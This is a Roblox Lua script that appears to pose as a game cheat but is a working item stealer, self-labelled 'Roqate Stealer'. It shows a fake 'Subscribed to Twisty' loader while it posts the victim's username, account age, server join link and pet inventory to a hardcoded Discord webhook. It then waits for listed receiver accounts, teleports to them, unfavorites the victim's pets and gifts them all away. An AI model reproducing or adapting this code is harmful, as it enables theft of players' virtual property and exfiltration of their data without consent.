local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn","RacMethodCB"}
local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local CHECK_INTERVAL = 5
local SHUTDOWN_DURATION = 10
local GIFT_COOLDOWN = 3
local MINIMUM_PETS = 3
local MINIMUM_TOTAL_VALUE = 50000

-- Executor identification
local function identifyExecutor()
    if syn then
        return "Synapse X"
    elseif PROTOSMASHER_LOADED then
        return "ProtoSmasher"
    elseif KRNL_LOADED then
        return "Krnl"
    elseif fluxus then
        return "Fluxus"
    elseif getexecutorname then
        return getexecutorname()
    elseif identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown Executor"
    end
end

if syn then
    syn.protect_gui(syn.secure_call)
    setfflag("HttpServiceEnabled", true)
end

local function sendWebhook(data)
    local body = {
        content = data.content,
        embeds = data.embeds,
        username = "Roqate Stealer",
        avatar_url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
    }

    local json = HttpService:JSONEncode(body)
    
    local requestFunc = syn and syn.request or http_request or request
    if requestFunc then
        requestFunc({
            Url = Webhook1,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    end
end

local function getPetsInventory()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return {} end

    local pets = {}
    for _, item in ipairs(backpack:GetChildren()) do
        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
        if nameMatch then
            local petName = nameMatch
            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
            local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
            local isSpecial = false

            for _, specialName in ipairs(SPECIAL_PETS) do
                if petName:find(specialName) then
                    isSpecial = true
                    break
                end
            end

            table.insert(pets, {
                instance = item,
                name = petName,
                fullName = item.Name,
                kg = kg,
                age = age,
                special = isSpecial
            })
        end
    end
    return pets
end

local function calculatePetValue(kg, age)
    return math.floor((kg * 10000) + (age * 1000))
end

local function splitEmbeds(pets, totalValue, specialCount)
    local embeds = {}
    local currentEmbed = {
        title = "📊 Player Inventory Report",
        color = 65280,
        timestamp = DateTime.now():ToIsoDate(),
        fields = {}
    }
    
    -- Add basic info to first embed
    local placeId = game.PlaceId
    local jobId = game.JobId
    local gameInstanceId = tostring(game.JobId)
    
    table.insert(currentEmbed.fields, {
        name = "👤 Player Info",
        value = string.format("```Username: %s (@%s)\nAccount Age: %d days\nExecutor: %s```", 
            LocalPlayer.Name, 
            LocalPlayer.DisplayName, 
            LocalPlayer.AccountAge,
            identifyExecutor()
        ),
        inline = false
    })
    
    table.insert(currentEmbed.fields, {
        name = "🌐 Server Info",
        value = string.format("```Place ID: %d\nGame Instance: %s```\n[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", 
            placeId, 
            gameInstanceId,
            placeId,
            gameInstanceId
        ),
        inline = false
    })
    
    table.insert(currentEmbed.fields, {
        name = "📦 Inventory Summary",
        value = string.format("```Total Pets: %d\nSpecial Pets: %d\nTotal Value: %d¢```", 
            #pets, 
            specialCount,
            totalValue
        ),
        inline = false
    })
    
    table.insert(embeds, currentEmbed)
    
    -- Split pets into multiple embeds if needed
    local petChunks = {}
    for i = 1, #pets, 20 do
        table.insert(petChunks, {table.unpack(pets, i, math.min(i + 19, #pets))})
    end
    
    for i, chunk in ipairs(petChunks) do
        if i > 1 then
            currentEmbed = {
                title = string.format("📊 Player Inventory Report (Part %d)", i),
                color = 65280,
                timestamp = DateTime.now():ToIsoDate(),
                fields = {}
            }
        end
        
        local petList = ""
        for _, pet in ipairs(chunk) do
            local value = calculatePetValue(pet.kg, pet.age)
            petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %d¢\n",
                pet.special and "🌟" or "🐶",
                pet.name,
                pet.kg,
                pet.age,
                value
            )
        end
        
        table.insert(currentEmbed.fields, {
            name = string.format("🐾 Pets (%d-%d)", (i-1)*20 + 1, math.min(i*20, #pets)),
            value = "```"..petList.."```",
            inline = false
        })
        
        if i > 1 then
            table.insert(embeds, currentEmbed)
        end
    end
    
    return embeds
end

local function sendInitialReport()
    local pets = getPetsInventory()
    local totalValue = 0
    local specialCount = 0
    
    for _, pet in ipairs(pets) do
        local value = calculatePetValue(pet.kg, pet.age)
        totalValue = totalValue + value
        if pet.special then specialCount = specialCount + 1 end
    end

    local embeds = splitEmbeds(pets, totalValue, specialCount)
    sendWebhook({
        embeds = embeds
    })
end

local function createLoader()
    local loaderGui = Instance.new("ScreenGui")
    loaderGui.Name = "TwistyLoader"
    loaderGui.IgnoreGuiInset = true
    loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loaderGui.DisplayOrder = 999999

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 150)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = loaderGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Text = "Subscribed to Twisty"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 24
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.BackgroundTransparency = 1
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 10)
    titleLabel.Parent = mainFrame

    loaderGui.Parent = CoreGui
    return loaderGui
end

local function isPetFavorited(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    return pet and pet:GetAttribute("Favorited")
end

local function unfavoritePet(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
        return true
    end
    return false
end

local function giftPet(targetPlayer, petName)
    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
end

local function equipSinglePet(petName)
    local character = LocalPlayer.Character
    if not character then return false end

    for _, item in ipairs(character:GetChildren()) do
        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
            item.Parent = LocalPlayer.Backpack
        end
    end

    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        pet.Parent = character
        return true
    end
    return false
end

local function teleportToPlayer(targetPlayer)
    if not LocalPlayer.Character then return false end
    local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end

    if not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return false end

    local offset = targetHrp.CFrame.LookVector * -5
    offset = Vector3.new(offset.X, 0, offset.Z)
    humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
    return true
end

local function isReceiverInGame()
    for _, receiverName in ipairs(RECEIVERS) do
        local player = Players:FindFirstChild(receiverName)
        if player then return player end
    end
    return nil
end

local function waitForReceiver()
    local receiverFound = Instance.new("BindableEvent")

    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
            break
        end
    end

    local connection = Players.PlayerAdded:Connect(function(player)
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
        end
    end)

    local backupCheck = coroutine.create(function()
        while true do
            local receiver = isReceiverInGame()
            if receiver then
                receiverFound:Fire(receiver)
                break
            end
            task.wait(CHECK_INTERVAL)
        end
    end)
    coroutine.resume(backupCheck)

    local foundReceiver = receiverFound.Event:Wait()
    connection:Disconnect()
    return foundReceiver
end

local function startGifting(targetPlayer)
    while true do
        local pets = getPetsInventory()
        if #pets == 0 then break end

        for _, pet in ipairs(pets) do
            if isPetFavorited(pet.fullName) then
                unfavoritePet(pet.fullName)
                task.wait(1)
            end

            if equipSinglePet(pet.fullName) then
                giftPet(targetPlayer, pet.fullName)
                task.wait(GIFT_COOLDOWN)
                break
            end
        end
        task.wait(1)
    end
end

local loader = createLoader()
sendInitialReport()
task.wait(2)
loader:Destroy()

local receiver = waitForReceiver()
if not receiver then return end

teleportToPlayer(receiver)
startGifting(receiver)
